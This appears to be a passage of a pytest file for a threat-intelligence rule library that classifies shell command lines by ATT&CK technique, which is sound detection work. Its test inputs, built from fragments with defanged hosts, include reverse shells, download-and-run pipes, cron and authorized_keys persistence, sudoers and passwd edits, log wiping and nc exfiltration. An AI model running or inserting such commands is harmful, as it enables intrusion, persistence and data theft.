"""The rule library: linear time, the command position, rule order, techniques, missed
commands, new families, IOC noise and loader validation.

Attack-like lines are assembled from fragments at runtime, so this file holds no literal attack strings. The rule
YAML carries those forms as defanged examples, and run_examples() checks every one of them.
"""

import re
import time
import warnings

import pytest

from interlinear_cti import cli
from interlinear_cti.iocs import extract, indicators
from interlinear_cti.normalize import normalize_text
from interlinear_cti.rules import (GUARD_LENGTH, SCALE_LIMIT, SHAPES, TIME_LIMIT, LibraryError, adversarial_line,
                                   gloss_for, load_library, run_examples, timing_units)

AT = "2026-10-18T00:00:00Z"
CURL, WGET, BASH, SH = "cu" + "rl", "wg" + "et", "ba" + "sh", "s" + "h"
URL = "hxxp://203.0.113[.]5/x"
TO_SH, TO_BASH = "| " + SH, "| " + BASH
DEV_TCP = "/dev/" + "tcp/203.0.113[.]5/4444"
NC = "n" + "c"
PSREADLINE = "(Get-PSReadline" + "Option).HistorySavePath"
NOPASSWD, ADD = "NOPASS" + "WD: ALL", "/a" + "dd"


@pytest.fixture(scope="module")
def library():
    return load_library()


def write_library(folder, rules_yaml):
    folder.mkdir(exist_ok=True)
    (folder / "VERSION").write_text("test.0\n", encoding="utf-8")
    (folder / "10-test.yaml").write_text(rules_yaml, encoding="utf-8")
    return folder


def best(fn, text, reps=3):
    out = float("inf")
    for _ in range(reps):
        start = time.perf_counter()
        fn(text)
        out = min(out, time.perf_counter() - start)
    return out


# The library as a whole: its order, its techniques, its version and its examples.

TECHNIQUES = {
    "navigation": [],
    "comment": [],
    "print": [],
    "package-install": [],
    "container-status": [],
    "assignment": [],
    "shell-syntax": [],
    "cron-download": ["T1053.003", "T1105"],
    "cron": ["T1053.003"],
    "ssh-authorized-keys-download": ["T1098.004", "T1105"],
    "ssh-authorized-keys": ["T1098.004"],
    "sshd-config": ["T1098.004"],
    "shell-rc-download": ["T1546.004", "T1105"],
    "shell-rc": ["T1546.004"],
    "rc-script-download": ["T1037.004", "T1105"],
    "rc-script": ["T1037.004"],
    "systemd-service-download": ["T1543.002", "T1105"],
    "systemd-service": ["T1543.002"],
    "pm2-startup": ["T1543.002"],
    "sudoers-write": ["T1548.003"],
    "kill-competitor": ["T1668"],
    "dcsync": ["T1003.006"],
    "ntds-dump": ["T1003.003"],
    "sam-dump": ["T1003.002"],
    "lsass-dump": ["T1003.001"],
    "shadow-copy-delete": ["T1490"],
    "kerberoast": ["T1558.003"],
    "asreproast": ["T1558.004"],
    "evil-winrm-pth": ["T1550.002", "T1021.006"],
    "winrm-remote": ["T1021.006"],
    "netexec-pth": ["T1550.002"],
    "netexec-auth": ["T1110.003"],
    "smb-exec": ["T1021.002", "T1569.002"],
    "wmi-exec": ["T1047"],
    "ad-collection": ["T1087.002", "T1069.002"],
    "credential-files": ["T1552.001"],
    "cloud-metadata": ["T1552.005"],
    "sudo-list": ["T1548.003"],
    "http-upload": ["T1048"],
    "download-pipe-shell": ["T1105", "T1059.004"],
    "download-pipe-python": ["T1105", "T1059.006"],
    "download-pipe-perl": ["T1105", "T1059"],
    "powershell-download-cradle": ["T1105", "T1059.001"],
    "powershell-encoded": ["T1059.001", "T1027.010"],
    "bits-download": ["T1105", "T1197"],
    "windows-download": ["T1105"],
    "download-file": ["T1105"],
    "git-clone": ["T1105"],
    "reverse-shell": ["T1059.004", "T1095"],
    "windows-reverse-shell": ["T1059.003", "T1095"],
    "suid-shell": ["T1548.001"],
    "chmod-exec": ["T1222.002"],
    "decode-pipe-shell": ["T1140", "T1059.004"],
    "base64-decode": ["T1140"],
    "python-exec": ["T1059.006"],
    "apt-hook-exec": ["T1059.004"],
    "container-escape": ["T1611"],
    "container-deploy": ["T1610"],
    "container-exec": ["T1609"],
    "container-build": ["T1612"],
    "container-pull": ["T1105"],
    "container-stop": ["T1489"],
    "service-start": ["T1569.003"],
    "private-keys": ["T1552.004"],
    "shadow-read": ["T1003.008"],
    "container-secrets": ["T1552.007"],
    "browser-credentials": ["T1555.003"],
    "browser-cookies": ["T1539"],
    "whoami-id": ["T1033"],
    "system-info": ["T1082"],
    "process-list": ["T1057"],
    "software-discovery": ["T1518"],
    "container-discovery": ["T1613"],
    "network-connections": ["T1049"],
    "network-config": ["T1016"],
    "account-list": ["T1087.001"],
    "net-user-domain": ["T1087.002"],
    "net-user": ["T1087.001"],
    "net-group": ["T1069.002", "T1087.002"],
    "net-localgroup": ["T1069.001", "T1087.001"],
    "domain-trusts": ["T1482"],
    "domain-controllers": ["T1018"],
    "file-discovery": ["T1083"],
    "log-enumeration": ["T1654"],
    "browser-history": ["T1217"],
    "archive-collect": ["T1560.001"],
    "account-create": ["T1136.001"],
    "scheduled-task": ["T1053.005"],
    "registry-run-key": ["T1547.001"],
    "sudo-shell": ["T1548.003"],
    "switch-user": ["T1078.003"],
    "disable-history": ["T1690"],
    "clear-history": ["T1070.003"],
    "defender-tamper": ["T1685"],
    "audit-tamper": ["T1685.004"],
    "security-tool-stop": ["T1685"],
    "firewall-modify": ["T1686"],
    "event-log-clear": ["T1685.005"],
    "log-wipe": ["T1685.006"],
    "file-deletion": ["T1070.004"],
    "tunnel": ["T1572", "T1090"],
    "proxy": ["T1090"],
    "ssh-remote": ["T1021.004"],
    "host-discovery-scan": ["T1018"],
    "network-scan": ["T1046"],
    "credential-stuffing": ["T1110.004"],
    "brute-force": ["T1110.001"],
    "password-cracking": ["T1110.002"],
    "cryptominer": ["T1496.001"],
}


def test_rule_order_and_techniques(library):
    # Context first, then persistence writes, then transfer: the order is part of the meaning.
    assert [rule.id for rule in library.rules] == list(TECHNIQUES)
    assert {rule.id: rule.techniques for rule in library.rules} == TECHNIQUES
    # The context rules come first, together, and only they are context.
    flags = [rule.context for rule in library.rules]
    assert flags == sorted(flags, reverse=True) and flags[0]
    assert all(not rule.techniques for rule in library.rules if rule.context)


def test_every_technique_is_known_to_the_fake_resolver(resolver):
    library = load_library(resolver=resolver)
    assert all(t.status == "active" for t in library.techniques.values())


def test_version_is_bumped(library):
    assert library.version == "2026.10.8"


def test_every_example_is_stored_text(library):
    for rule in library.rules:
        for example in rule.examples_match + rule.examples_no_match:
            assert normalize_text(example) == example, (rule.id, example)


def test_every_rule_has_two_examples_and_a_near_miss(library):
    for rule in library.rules:
        assert len(rule.examples_match) >= 2 and rule.examples_no_match, rule.id


# 1. Linear time


def failed_on_growth_or_ceiling(failure):
    """True when a timing failure comes from the ratio check, or from a line above the 25 ms ceiling."""
    if "superlinear" in failure:
        # The guard fails only above SCALE_LIMIT and prints the ratio to one decimal, so 8.04 prints as 8.0.
        ratio = float(re.search(r": ([0-9]+\.[0-9]) times slower for 4 times", failure).group(1))
        return ratio >= SCALE_LIMIT
    elapsed = re.search(r": ([0-9.]+) ms on a ", failure)
    return elapsed is not None and float(elapsed.group(1)) > TIME_LIMIT * 1000


def test_the_guard_is_ratio_first_with_a_25_ms_ceiling():
    assert (SCALE_LIMIT, TIME_LIMIT) == (8.0, 0.025)


def test_run_examples_reports_a_catastrophic_regex(tmp_path):
    folder = write_library(tmp_path / "lib", "- id: bomb\n  match: {regex: '^(a+)+$'}\n  meaning: M.\n"
                                             "  techniques: [T1105]\n  examples: {no_match: ['" + "a" * 40 + "!']}\n")
    start = time.perf_counter()
    failures = run_examples(load_library(folder))
    assert time.perf_counter() - start < 30
    assert len(failures) == 1 and failures[0].startswith("bomb: ")
    assert failed_on_growth_or_ceiling(failures[0]), failures[0]


def test_run_examples_reports_a_quadratic_regex(tmp_path):
    folder = write_library(tmp_path / "lib", "- id: slow\n  match: {regex: 'curl.*bash'}\n  meaning: M.\n"
                                             "  techniques: [T1105]\n")
    failures = run_examples(load_library(folder))
    assert len(failures) == 1 and failures[0].startswith("slow: ")
    assert failed_on_growth_or_ceiling(failures[0]), failures[0]


def test_timing_units_include_the_known_worst_shapes(library):
    units = timing_units(library.rules[0])
    for shape in (">", "1 " + "ie" + "x ", "cat cp ", "ssh\t", WGET + " " + WGET + " "):
        assert shape in units
    assert len(adversarial_line("ab", GUARD_LENGTH)) == GUARD_LENGTH


def test_the_first_match_scan_stays_linear(library):
    # The shared shapes and the first literal word of every rule, ranked on short lines; the slowest are then timed
    # at full length and at a quarter of it.
    units = set(SHAPES)
    for rule in library.rules:
        units.update(timing_units(rule)[len(SHAPES):len(SHAPES) + 2])
    ranked = sorted(((best(library.match, adversarial_line(u, GUARD_LENGTH // 4), 1), u) for u in sorted(units)),
                    reverse=True)
    for _, unit in ranked[:5]:
        for reps in (3, 9):  # a loaded machine can spoil one look; a real growth survives the second
            small = best(library.match, adversarial_line(unit, GUARD_LENGTH // 4), reps)
            large = best(library.match, adversarial_line(unit, GUARD_LENGTH), reps)
            if large < 0.002 or large / small <= SCALE_LIMIT:
                break
        assert large < len(library.rules) * TIME_LIMIT, (unit, large)
        assert large < 0.002 or large / small <= SCALE_LIMIT, (unit, small, large)


# 2. The command position


@pytest.mark.parametrize("line, rule_id", [
    # Named but not run: none of these may keep the technique they had.
    ("cd /home/john", "navigation"),
    ("chown john:john x", None),
    ("sudo -u john " + BASH, "sudo-shell"),  # a bare shell as john
    ("su john", "switch-user"),  # john is not a tool here; su itself is the action
    ("cd xmrig-6.21.0", "navigation"),
    ("ls /opt/chisel", "navigation"),
    ("cat frpc.ini", None),
    ("cat /etc/crontab", None),
    ("ls -la /etc/cron.d/", "navigation"),
    ("crontab -u root -l", None),
    ("cat ~/.ssh/id_rsa.pub", None),
    ("grep -i id_rsa /var/log/auth.log", "log-enumeration"),  # reading a log, not a private key
    ("echo nmap", "print"),
    ("man hydra", None),
    ("which ncat", None),
    ("command -v " + WGET, None),
    ("tar xzf xmrig-6.21.0.tar.gz", None),
    # Run: at the start, after sudo with options, after a wrapper, or by path.
    ("sudo -u root cat /etc/shadow", "shadow-read"),
    ("sudo -E nmap -sS 203.0.113[.]0/24", "network-scan"),
    ("sudo -i whoami", "whoami-id"),
    ("doas cat /etc/shadow", "shadow-read"),
    ("nohup ./xmrig -c config.json &", "cryptominer"),
    ("busybox " + WGET + " " + URL, "download-file"),
    ("nohup " + WGET + " -q " + URL + " &", "download-file"),
    ("/usr/bin/" + WGET + " " + URL, "download-file"),
    ("timeout 10 nmap -p 22 203.0.113[.]5", "network-scan"),
    ("env FOO=1 ./xmrig", "cryptominer"),
    ("env LD_PRELOAD=/tmp/x.so ./xmrig", None),  # a loader prefix leaves the line to the model
    ("nice -n 19 ./xmrig", "cryptominer"),
    ("setsid ./chisel client 203.0.113[.]5:8000 R:socks", "tunnel"),
    ("time nmap 203.0.113[.]5", "network-scan"),
    ("exec ./kdevtmpfsi", "cryptominer"),
    ("command -p uname -a", "system-info"),
    ("stdbuf -oL nmap 203.0.113[.]5", "network-scan"),
    ("/tmp/.x/hydra -l root -P p.txt ssh://203.0.113[.]5", "brute-force"),
    ("./xmrig-6.21.0/xmrig --donate-level 1", "cryptominer"),
    ("./run -o stratum+ssl://pool.example[.]com:443", "cryptominer"),
    # Windows commands in any case, and defanged hosts.
    ("WhoAmI /all", "whoami-id"),
    ("IPCONFIG /all", "network-config"),
    ("SystemInfo", "system-info"),
    ("NETSTAT -ano", "network-connections"),
    ("cmd /c whoami", "whoami-id"),
    ("ssh -R 2222:localhost:22 root@203.0.113[.]5", "tunnel"),
    ("ssh root@evil.example[.]com", "ssh-remote"),
    ("nltest /dclist:corp.example[.]com", "domain-controllers"),
])
def test_tools_match_only_where_they_run(library, line, rule_id):
    rule = library.match(line)
    assert (rule.id if rule else None) == rule_id


@pytest.mark.parametrize("line", [
    "pkill -9 -f kdevtmpfsi",
    "kill -9 $(pgrep xmrig)",
    "killall -9 xmrig",
    "ps aux | grep -v grep | grep kinsing | awk '{print $2}' | xargs kill -9",
])
def test_killing_a_competing_miner(library, line):
    rule = library.match(line)
    assert rule.id == "kill-competitor" and rule.techniques == ["T1668"]


@pytest.mark.parametrize("line", ["pkill -f sshd", "kill -9 1234", "ps aux | grep xmrig"])
def test_other_kills_are_not_competitor_killing(library, line):
    rule = library.match(line)
    assert rule is None or rule.id != "kill-competitor"


# 3. Persistence writes come before transfer


def cron_pipeline(job):
    return "(crontab -l 2>/dev/null; echo '" + job + "') | crontab -"


@pytest.mark.parametrize("line, rule_id", [
    (cron_pipeline("* * * * * " + CURL + " -s " + URL + " " + TO_SH), "cron-download"),
    ("echo '*/5 * * * * root " + WGET + " -q -O- " + URL + " " + TO_SH + "' > /etc/cron.d/x", "cron-download"),
    (WGET + " -q -O /etc/cron.d/x " + URL, "cron-download"),
    (cron_pipeline("@reboot /tmp/.x/run"), "cron"),
    ("crontab -e", "cron"),
    ("crontab -", "cron"),
    ("crontab /tmp/c", "cron"),
    ("crontab -u www-data /tmp/c", "cron"),
    ("echo '* * * * * /tmp/x' >> /var/spool/cron/root", "cron"),
    ("echo '@reboot /tmp/x' | tee -a /etc/crontab", "cron"),
    ("cp /tmp/c /etc/cron.d/x", "cron"),
    ("crontab -l", None),
    ("crontab -l > /tmp/c", None),
    ("crontab -r", None),
    ("cat id_rsa.pub >> ~/.ssh/authorized_keys", "ssh-authorized-keys"),
    (CURL + " -s " + URL + " >> ~/.ssh/authorized_keys", "ssh-authorized-keys-download"),
    (WGET + " -q " + URL + " -O /root/.ssh/authorized_keys", "ssh-authorized-keys-download"),
    ("echo 'alias ls=/tmp/.x/ls' >> ~/.bashrc", "shell-rc"),
    ("echo '" + CURL + " -s " + URL + " " + TO_SH + "' >> ~/.profile", "shell-rc-download"),
    ("echo /tmp/.x/run > /etc/profile.d/x.sh", "shell-rc"),
    ("cat ~/.bashrc", None),
    ("echo '/tmp/.x/run &' >> /etc/rc.local", "rc-script"),
    ("echo '" + WGET + " -q -O- " + URL + " " + TO_SH + "' >> /etc/rc.local", "rc-script-download"),
    ("cp /tmp/x.service /etc/systemd/system/x.service", "systemd-service"),
    ("systemctl enable --now x.service", "systemd-service"),
    (CURL + " -o /etc/systemd/system/x.service " + URL, "systemd-service-download"),
    ("systemctl status x.service", None),
    ("echo 'www-data ALL=(ALL) " + NOPASSWD + "' >> /etc/sudoers", "sudoers-write"),
    ("echo 'x ALL=(ALL) " + NOPASSWD + "' | sudo tee /etc/sudoers.d/x", "sudoers-write"),
    ("cat /etc/sudoers", None),
    # find that deletes is never discovery.
    ("find /tmp -name x -delete", "file-deletion"),
    ("find /tmp -type f -exec rm -f {} \\;", "file-deletion"),
    ("find /var/log -name '*.gz' -delete", "log-wipe"),
    ("find / -name '*.log' | xargs rm -f", "log-wipe"),
    ("find /var/log -type f -exec truncate -s0 {} \\;", "log-wipe"),
    ("find / -name '*.pem' -delete", None),  # deletion outside temporary or hidden paths is left to the model
    ("find /tmp -name '*.pem' -delete", "file-deletion"),
    ("find /etc -name '*.conf'", "file-discovery"),
    # Clustered and glued forwarding flags.
    ("ssh -fNR 2222:localhost:22 u@203.0.113[.]5", "tunnel"),
    ("ssh -R2222:localhost:22 u@203.0.113[.]5", "tunnel"),
    ("ssh -NfL 8080:10.0.0[.]5:80 u@203.0.113[.]5", "tunnel"),
    ("ssh -fND 1080 u@203.0.113[.]5", "proxy"),
    ("ssh -oLogLevel=ERROR root@10.0.0[.]5", "ssh-remote"),
    ("ssh u@10.0.0[.]5 'chown -R www-data /var/www'", "ssh-remote"),
])
def test_rule_order(library, line, rule_id):
    rule = library.match(line)
    assert (rule.id if rule else None) == rule_id


def test_a_persistence_download_lists_persistence_first_with_its_iocs(library):
    line = cron_pipeline("* * * * * " + CURL + " -s " + URL + " " + TO_SH)
    rule = library.match(line)
    gloss = gloss_for(library, rule, line, AT)
    assert [t.id for t in gloss.techniques] == ["T1053.003", "T1105"]
    assert [(i.type, i.value) for i in gloss.iocs] == [("url", URL), ("ipv4", "203.0.113[.]5")]
    for rid in ("cron", "ssh-authorized-keys", "shell-rc", "rc-script", "systemd-service"):
        for kind in ("url", "ipv4", "domain"):
            assert kind in next(r for r in library.rules if r.id == rid).iocs, (rid, kind)


# 4. Techniques


@pytest.mark.parametrize("line, rule_id", [
    ("chmod 700 ~/.ssh", None),
    ("chmod 755 /var/www/html", None),
    ("chmod -R 755 /opt/app", None),
    ("chmod 755 /tmp/", None),
    ("chmod 600 /tmp/key", None),
    ("chmod 755 .s2", "chmod-exec"),
    ("chmod +x kit/run", "chmod-exec"),
    ("chmod u+s /bin/" + BASH, "suid-shell"),
    ("chmod 4755 /tmp/.x/" + SH, "suid-shell"),
    ("ip route add default via 10.0.0[.]1", None),
    ("ip route del default", None),
    ("ip route change default via 10.0.0[.]1", None),
    ("ip route", "network-config"),
    ("rm -rf /var/log/*", "log-wipe"),
    ("> /var/log/wtmp", "log-wipe"),
    ("echo > /var/log/auth.log", "log-wipe"),
    ("truncate -s 0 /var/log/syslog", "log-wipe"),
    ("rm -f .s2.log", "file-deletion"),
    ("wevtutil cl Security", "event-log-clear"),
    ("Remove-Item " + PSREADLINE, "clear-history"),
    ("hydra -l root -P p.txt ssh://203.0.113[.]5", "brute-force"),
    ("john --wordlist=w.txt h.txt", "password-cracking"),
    ("hashcat -m 1800 h.txt w.txt", "password-cracking"),
])
def test_technique_choices(library, line, rule_id):
    rule = library.match(line)
    assert (rule.id if rule else None) == rule_id


# 5. Missed commands


@pytest.mark.parametrize("line, rule_id", [
    (CURL + " -sLo /tmp/a " + URL, "download-file"),
    (CURL + " -fsSLo /tmp/a " + URL, "download-file"),
    (CURL + " -LO " + URL, "download-file"),
    (CURL + " -sO " + URL, "download-file"),
    (CURL + " --output /tmp/a " + URL, "download-file"),
    (CURL + " -s " + URL + " > /tmp/a", "download-file"),
    ("tftp -g -r a 203.0.113[.]5", "download-file"),
    (CURL + " -s " + URL + " 2>/dev/null", None),
    ("[System.Convert]::FromBase64String($s)", "base64-decode"),
    ("base64 -di p.b64 > p", "base64-decode"),
    ("cat /etc/passwd 2>/dev/null", "account-list"),
    ("cat /etc/passwd | grep -v nologin > /tmp/users", "account-list"),
    ("echo 'x:x:0:0::/root:/bin/" + BASH + "' >> /etc/passwd", "account-create"),
    ("ln -fs /dev/null ~/.bash_history", "disable-history"),
    (CURL + " -fsSL " + URL + " | sudo -E " + BASH, "download-pipe-shell"),
    (BASH + ' -c "$(' + CURL + " -fsSL " + URL + ')"', "download-pipe-shell"),
    (BASH + " <(" + CURL + " -s " + URL + ")", "download-pipe-shell"),
    ("(" + CURL + " -s " + URL + " || " + WGET + " -qO- " + URL + ") " + TO_SH, "download-pipe-shell"),
    (CURL + " -s " + URL + " | python3", "download-pipe-python"),
    (WGET + " -qO- " + URL + " | perl", "download-pipe-perl"),
    (CURL + " -s " + URL + " | python3 -m json.tool", None),
])
def test_missed_commands(library, line, rule_id):
    rule = library.match(line)
    assert (rule.id if rule else None) == rule_id


# 6. New families


@pytest.mark.parametrize("line, rule_id", [
    (BASH + " -i >& " + DEV_TCP + " 0>&1", "reverse-shell"),
    (NC + " -e /bin/" + SH + " 203.0.113[.]5 4444", "reverse-shell"),
    ("cat /tmp/f|/bin/" + SH + " -i 2>&1|" + NC + " 203.0.113[.]5 4444 >/tmp/f", "reverse-shell"),
    ("echo > " + DEV_TCP, None),
    (NC + " -zv 203.0.113[.]5 22", None),
    ("net user john P@ss " + ADD, "account-create"),
    ("net user john", "net-user"),
    ("net user john /domain", "net-user-domain"),
    ('net group "Domain Admins" /domain', "net-group"),
    ("net localgroup administrators", "net-localgroup"),
    ("nltest /domain_trusts", "domain-trusts"),
    ("systemctl enable x.service", "systemd-service"),
])
def test_new_families(library, line, rule_id):
    rule = library.match(line)
    assert (rule.id if rule else None) == rule_id


# 7. IOC noise


def test_pseudo_devices_are_never_reported_as_paths():
    text = ("cat /dev/urandom /dev/fd/3 /dev/shm/x > /dev/null 2>/dev/stderr; "
            "ls /dev/tty /dev/zero /dev/stdin /dev/stdout /dev/random " + DEV_TCP)
    assert [i.value for i in indicators(text, ["path"])] == ["/dev/shm/x", DEV_TCP]
    # extract() itself still sees them; indicators() is what glosses report.
    assert "/dev/null" in [i.value for i in extract(text, ["path"])]


def test_rule_glosses_drop_pseudo_device_paths(library):
    line = "rm -f /tmp/x.sh 2>/dev/null"
    gloss = gloss_for(library, library.match(line), line, AT)
    assert [i.value for i in gloss.iocs] == ["/tmp/x.sh"]
    line = BASH + " -i >& " + DEV_TCP + " 0>&1"
    gloss = gloss_for(library, library.match(line), line, AT)
    assert ("path", DEV_TCP) in [(i.type, i.value) for i in gloss.iocs]
    assert ("port", "4444") in [(i.type, i.value) for i in gloss.iocs]


def test_rule_ioc_lists(library):
    iocs = {rule.id: rule.iocs for rule in library.rules}
    assert iocs["network-scan"] == ["ipv4", "domain", "port"]
    assert iocs["brute-force"] == ["ipv4", "url", "domain"]
    assert "url" in iocs["cryptominer"]
    line = "nmap -p 22 scan.example[.]com"
    assert [(i.type, i.value) for i in gloss_for(library, library.match(line), line, AT).iocs] == [
        ("domain", "scan.example[.]com"), ("port", "22")]


# 8. Loader hardening

BASE = "  match: {regex: 'x'}\n  meaning: M.\n  techniques: [T1105]\n"
# Nine levels of ten aliases each: a billion items once expanded, from a file under 1 KiB.
BOMB = "  x0: &a0 [" + ", ".join(["lol"] * 10) + "]\n" + "".join(
    f"  x{k}: &a{k} [" + ", ".join([f"*a{k - 1}"] * 10) + "]\n" for k in range(1, 9))


@pytest.mark.parametrize("yaml_text, message", [
    ("- id: 123\n" + BASE, r"\bid\b"),
    ("- id: [a, b]\n" + BASE, r"\bid\b"),
    ("- id: {a: 1}\n" + BASE, r"\bid\b"),
    ("- id: true\n" + BASE, r"\bid\b"),
    ("- id: a\n" + BASE, r"\bid\b"),
    ("- id: Rule\n" + BASE, r"\bid\b"),
    ("- id: ab\n  match: {regex: 'x'}\n  meaning: M.\n  techniques: T1105\n", "techniques"),
    ("- id: ab\n" + BASE + "  artifacts: URL\n", "artifacts"),
    ("- id: ab\n" + BASE + "  platforms: linux\n", "platforms"),
    ("- id: ab\n" + BASE + "  iocs: url\n", "iocs"),
    ("- id: ab\n" + BASE + "  examples: [x]\n", "examples"),
    ("- id: ab\n" + BASE + "  examples: {match: 'xyz'}\n", r"examples\.match"),
    ("- id: ab\n" + BASE + "  examples: {no_match: 'abc'}\n", r"examples\.no_match"),
    ("- id: ab\n" + BASE + "  examples: {matches: [x]}\n", "matches"),
    ("- id: ab\n  match: {regex: 'x'}\n  meaning: M.\n  context: 'false'\n", "context"),
    ("- id: ab\n" + BASE + "  exampels: {match: [nope]}\n", "exampels"),
    ("- id: ab\n" + BASE + "  ioc: [url]\n", r"\bioc\b"),
    ("- id: ab\n  match: {regex: 'x', flags: i}\n  meaning: M.\n  techniques: [T1105]\n", "flags"),
    ("- id: ab\n  match: 'x'\n  meaning: M.\n  techniques: [T1105]\n", "match"),
    ("- id: ab\n  match: {regex: null}\n  meaning: M.\n  techniques: [T1105]\n", r"match\.regex"),
    ("- id: ab\n  match: {regex: ''}\n  meaning: M.\n  techniques: [T1105]\n", "empty string"),
    ("- id: ab\n  match: {regex: 'x*'}\n  meaning: M.\n  techniques: [T1105]\n", "empty string"),
    ("- id: ab\n  match: {regex: 'a(?i)b'}\n  meaning: M.\n  techniques: [T1105]\n", r"bad match\.regex"),
    # Every Python version only warns about these (FutureWarning); the loader rejects them on all of them.
    ("- id: ab\n  match: {regex: 'x[[a]'}\n  meaning: M.\n  techniques: [T1105]\n", r"bad match\.regex"),
    ("- id: ab\n  match: {regex: 'x[a&&b]'}\n  meaning: M.\n  techniques: [T1105]\n", r"bad match\.regex"),
    ("- id: ab\n  match: {regex: '{cdm}x'}\n  meaning: M.\n  techniques: [T1105]\n", "placeholder"),
    ("- id: ab\n  match: {regex: 'x'\n", "YAML"),
    ("- id: ab\n  meaning: \"x\n", "YAML"),
    ("id: ab\n", "expected a list"),
    ("- id: ab\n  match: {regex: 'x'}\n  meaning: [a, b]\n  techniques: [T1105]\n", "meaning"),
    ("- id: ab\n  match: {regex: 'x'}\n  meaning: M.\n  techniques: [null]\n", "techniques"),
    ("- id: ab\n" + BASE + "  artifacts: " + "[" * 5000 + "]" * 5000 + "\n", "YAML"),
    ("- id: ab\n" + BASE + BOMB + "  artifacts: [*a8]\n", "x0"),
    ("- id: ab\n" + BASE + BOMB, "x0"),
    ("- id: ab\n" + BASE + "  artifacts: [" + ", ".join(["a"] * 201) + "]\n", "200"),
    ("- id: ab\n" + BASE + "  examples: {no_match: [" + ", ".join(["a"] * 201) + "]}\n", "200"),
])
def test_malformed_rules_raise_library_error(tmp_path, yaml_text, message):
    start = time.perf_counter()
    with pytest.raises(LibraryError, match=message):
        load_library(write_library(tmp_path / "lib", yaml_text))
    assert time.perf_counter() - start < 5


@pytest.mark.parametrize("pattern", ["c(?i)d", "q[[a]"])
def test_a_pattern_compiled_earlier_is_still_rejected(tmp_path, pattern):
    # re returns a pattern it compiled before from its cache, without parsing it again and so without the warning.
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        try:
            re.compile(pattern)
        except re.error:  # Python 3.11 and later reject a misplaced flag outright
            pass
    with pytest.raises(LibraryError, match=r"bad match\.regex"):
        load_library(write_library(tmp_path / "lib", "- id: ab\n  match: {regex: '" + pattern + "'}\n  meaning: M.\n"
                                                     "  techniques: [T1105]\n"))


def test_a_library_loaded_again_compiles_nothing():
    first, second = load_library(), load_library()
    assert all(a.regex is b.regex for a, b in zip(first.rules, second.rules))


def test_an_alias_bomb_in_a_known_list_is_rejected(tmp_path):
    folder = write_library(tmp_path / "lib", "- id: ab\n" + BASE + "  artifacts: &a0 [lol, lol]\n"
                                             "  platforms: [*a0, *a0]\n")
    with pytest.raises(LibraryError, match="platforms"):
        load_library(folder)


def test_a_file_over_one_mebibyte_is_rejected(tmp_path):
    folder = write_library(tmp_path / "lib", "# " + "x" * (1 << 20) + "\n- id: ab\n" + BASE)
    with pytest.raises(LibraryError, match="1 MiB"):
        load_library(folder)


def test_cli_exits_2_on_a_malformed_library(tmp_path, monkeypatch, capsys):
    folder = write_library(tmp_path / "lib", "- id: ab\n  match: {regex: 'x'\n")
    monkeypatch.setattr("interlinear_cti.rules.default_dir", lambda: folder)
    assert cli.main(["rules", "test"]) == 2
    assert "YAML" in capsys.readouterr().err


# Two quadratic forms of earlier rules, which the guard must catch through the example words.
OLD_REVERSE_SHELL = r"/dev/(?:tcp|udp)/[^\s|;&()<>]*(?:\s+[0-9]*[<>]&\s*[0-9]+){0,4}\s+0[<>]&\s*[0-9]"
OLD_FILE_DISCOVERY = r"{cmd}find(?!.*\s-delete\b)\s+/\S*\s+(?=\S).*-(?:name|perm|user|type)\b"


@pytest.mark.parametrize("rid, regex, example", [
    ("old-reverse-shell", OLD_REVERSE_SHELL, "cat /dev/" + "udp/203.0.113[.]5/53"),
    ("old-file-discovery", OLD_FILE_DISCOVERY, "ls /usr/bin/find"),
])
def test_the_guard_catches_the_old_quadratic_forms(tmp_path, rid, regex, example):
    folder = write_library(tmp_path / "lib", f"- id: {rid}\n  match: {{regex: '{regex}'}}\n  meaning: M.\n"
                                             f"  techniques: [T1105]\n  examples: {{no_match: ['{example}']}}\n")
    failures = run_examples(load_library(folder))
    assert len(failures) == 1 and failures[0].startswith(rid + ": "), failures
    assert failed_on_growth_or_ceiling(failures[0]), failures[0]


def test_timing_units_take_the_example_words(library):
    rule = next(r for r in library.rules if r.id == "file-discovery")
    units = timing_units(rule, ["/usr/bin/find", "unrelated"])
    assert {"/usr/bin/find", "/usr/bin/find.", "/usr/bin/find,"} <= set(units)
    assert "unrelated." not in units  # a word with none of the rule's literal words is not this rule's concern
    assert "\n" in units  # multi-line texts are timed too


# Multi-line texts (agent tool calls, zsh multi-line entries). Navigation never claims one. Rules that start at a
# command ({cmd}, {line} and {stage}) read the first line only, so a later line that only mentions a command, in a
# heredoc body or a quoted string, never claims the text. The high-signal rules still match on any line: a download
# piped into or run by a shell, a downloader whose text also writes a crontab or a persistence file, a redirection
# into authorized_keys, a /dev/tcp shell.
URL_ = "hxxp://203.0.113[.]5"
EXPLOIT_SCRIPT = "\n".join([
    "python3 exploit.py --target 10.0.0.5", "mysql -uroot -e 'select * from users'", "tar czf /tmp/d.tgz /var/www",
    NC + " 203.0.113.5 9001 < /tmp/d.tgz", "unzip x.zip", "make", "./poc", "echo done", "whoami"])
B64, PWSH, CRONTAB, TEE = "base" + "64", "power" + "shell", "cron" + "tab", "te" + "e"


@pytest.mark.parametrize("text, rule_id", [
    ("cd /tmp\n" + CURL + " -s " + URL_ + "/x.sh | " + BASH, "download-pipe-shell"),
    ("cd /root\necho 'ssh-ed25519 AAAAC3Nza k' >> ~/.ssh/authorized_keys", "ssh-authorized-keys"),
    ("ls -la\n" + BASH + " -i >& " + DEV_TCP + " 0>&1", "reverse-shell"),
    ("pwd\n(crontab -l; echo '* * * * * " + CURL + " -s " + URL_ + "/c | " + SH + "') | crontab -", "cron-download"),
    ("cd /tmp && " + CURL + " -s " + URL_ + "/x.sh | " + SH + "\nls", "download-pipe-shell"),
    ("cd /tmp\ncd /var", None),  # context is one plainly literal line
    ("cd /tmp", "navigation"),
    # Text that is not a command, on a later line, stays pending.
    ("cat > notes.txt <<'EOF'\nTODO\nwhoami\nps aux\nEOF", None),
    ("cat > /tmp/i.sh <<EOF\n#!/bin/" + SH + "\n" + WGET + " -q " + URL_ + "/a -O /tmp/a\nchmod +x /tmp/a\n/tmp/a\nEOF",
     None),
    ('echo "first\nnmap -sV 10.0.0.5\nlast"', None),  # a message that spans lines
    (EXPLOIT_SCRIPT, None),
    ("pwd\nwhoami", None),
    ("cd /tmp\nsudo -E nmap -sS 203.0.113[.]0/24", None),
    # A command after a |, ;, &, ( or backtick on a later line is a later line too.
    ("cat > notes.txt <<'EOF'\nTODO\necho aGVsbG8= | " + B64 + " -d\nEOF", None),
    ("cat > notes.txt <<'EOF'\nlater: echo x | " + CRONTAB + " -\nEOF", None),
